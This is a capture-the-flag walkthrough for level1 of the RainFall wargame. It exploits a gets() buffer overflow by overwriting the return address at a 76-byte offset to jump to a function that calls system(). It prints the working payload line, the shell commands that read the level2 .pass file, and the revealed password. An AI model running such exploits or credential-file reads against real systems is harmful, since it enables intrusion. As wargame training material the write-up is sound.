# Level1 -> 2

## Objective

The goal of Level 2 is to escalate from `level1` to `level2` by exploiting a buffer overflow vulnerability in the `level1` binary. By the end, you should be able to read the password for `level2`.

---

## Step 1: Examine the Binary

After switching to `level1`:

```bash
level0@RainFall:~$ su level1
Password:
level1@RainFall:~$ ls
level1
```

Running the binary with various input lengths shows:

```bash
level1@RainFall:~$ ./level1
aaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

> Observations:
>
> * The program crashes after a long input → likely a **buffer overflow**.

---

## Step 2: Investigate with `ltrace`

```bash
level1@RainFall:~$ ltrace ./level1
gets(0xbffff720, 47, ...) = 0xbffff720
--- SIGSEGV (Segmentation fault) ---
```

> The program uses `gets()`, which **does not check buffer lengths**, confirming a buffer overflow vulnerability.

---

## Step 3: Determine Offset

To exploit the overflow, we need to find the exact offset to overwrite the return address. Start by creating input of increasing lengths:

```bash
python -c 'print "a" * 20' > /tmp/test
./level1 < /tmp/test
python -c 'print "a" * 40' > /tmp/test
./level1 < /tmp/test
python -c 'print "a" * 60' > /tmp/test
./level1 < /tmp/test
python -c 'print "a" * 80' > /tmp/test
./level1 < /tmp/test
Segmentation fault (core dumped)
```

* The crash occurs around 80 bytes → the **return address is likely near the 72-76th byte**.

---

## Step 3.1: Find the Offset with GDB

You can use GDB to precisely determine the offset needed to overwrite the return address:

1. Start GDB:
    ```bash
    gdb ./level1
    ```

2. Set a breakpoint at `main` and run with a large input:
    ```bash
    (gdb) b main
    (gdb) r < <(python -c 'print("A"*100)')
    ```

3. When the program crashes, check the stack pointer:
    ```bash
    (gdb) info registers esp
    ```

4. Examine the stack near the crash:
    ```bash
    (gdb) x/40x $esp
    ```

5. Look for the sequence of `0x41` (ASCII 'A') and note where it ends—this is where your input overwrites the return address.

6. Adjust your input length and repeat until you see the return address replaced by `0x41414141`.

> This confirms the exact offset needed to control the return address.

---

## Step 4: Analyze in GDB

```bash
gdb ./level1
(gdb) b main
(gdb) r < /tmp/test
```

Step through the program with `ni` (next instruction) until the crash:

* You will notice the return address is overwritten.
* The `run` function eventually calls `system()`.

---

## Step 5: Find the `system()` Address

List functions:

```bash
(gdb) info functions
0x08048360  system
0x08048444  run
0x08048480  main
```

> We will attempt to overwrite the return address to jump to `system()`.

---

## Step 6: Craft Exploit

First attempt (incorrect offset):

```bash
python -c 'print "a" * 72 + "\x44\x84\x04\x08"' > /tmp/test
./level1 < /tmp/test
Illegal instruction (core dumped)
```

* The offset was slightly off.
* Adjusting by 4 bytes:

```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/test
./level1 < /tmp/test
Good... Wait what?
```

> Success! The program executes, giving us a shell-like prompt.

---

## Step 7: Escalate to `level2`

Interact with the program:

```bash
cat /tmp/test - | ./level1
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
exit
```

* The password for `level2` is revealed.
* Exit:

```bash
exit
```

---

## Step 8: Summary

* **Vulnerability:** `gets()` allows a buffer overflow.
* **Offset:** 76 bytes to the return address.
* **Target:** `system()` function in `run()`.
* **Outcome:** Shell execution allows reading the `level2` password.

> With this, you can `su level2` using the retrieved password.

---

**End of Level 2 Walkthrough**
